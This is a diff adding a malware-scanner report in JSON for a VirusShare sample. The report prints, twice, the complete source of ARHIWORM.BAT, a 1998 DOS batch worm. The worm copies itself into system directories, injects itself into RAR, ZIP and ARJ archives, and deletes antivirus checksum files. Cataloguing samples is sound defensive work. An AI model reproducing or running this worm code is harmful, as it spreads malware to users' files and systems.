@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@ctty nul\nif \"%1\"==\"-rar\" goto rar\nif \"%1\"==\"-zip\" goto zip\nif \"%1\"==\"-arj\" goto arj\ncopy %0 c:\\dos\\%0\ncopy %0 c:\\windows\\%0\ncopy %0 c:\\win95\\%0\ncopy %0 c:\\%0\ncopy %0 ..\\%0\nfor %%r in (*.rar) do call %0 -rar %%r\nfor %%z in (*.zip) do call %0 -zip %%z\nfor %%a in (*.arj) do call %0 -arj %%a\ndel chklist.*\ngoto end\n:rar\nattrib -r %2\nrar a -tk -y -c- -o+ %2 %0\ngoto end\n:zip\nattrib -r %2\npkzip -m %2 %0\ngoto end\n:arj\nattrib -r %2\narj a -d %2 %0\n:end\nctty con\n@rem ARHIWORM.BAT v2.0 - files worm  (c) by Duke [SMF] 9.06.98"
+    },
+    "filename": "VirusShare_598e9291dbb47cb40e6f60b2688ce810",
+    "filesize": 547,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "598e9291dbb47cb40e6f60b2688ce810",
+        "sha1": "7256b72b477b07d36de10cae7f8776f8bce21d6d",
+        "sha256": "00e61835f9213e9d14a457f717057c318717b386f452a1c0f8e5210b0b53b974"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul",
+            "if \"%1\"==\"-rar\" goto rar",
+            "if \"%1\"==\"-zip\" goto zip",
+            "if \"%1\"==\"-arj\" goto arj",
+            "copy %0 c:\\dos\\%0",
+            "copy %0 c:\\windows\\%0",
+            "copy %0 c:\\win95\\%0",
+            "copy %0 c:\\%0",
+            "copy %0 ..\\%0",
+            "for %%r in (*.rar) do call %0 -rar %%r",
+            "for %%z in (*.zip) do call %0 -zip %%z",
+            "for %%a in (*.arj) do call %0 -arj %%a",
+            "del chklist.*",
+            "goto end",
+            ":rar",
+            "attrib -r %2",
+            "rar a -tk -y -c- -o+ %2 %0",
+            "goto end",
+            ":zip",
+            "attrib -r %2",
+            "pkzip -m %2 %0",
+            "goto end",
+            ":arj",
+            "attrib -r %2",
+            "arj a -d %2 %0",
+            ":end",
+            "ctty con",
+            "@rem ARHIWORM.BAT v2.0 - files worm  (c) by Duke [SMF] 9.06.98"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.287437",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
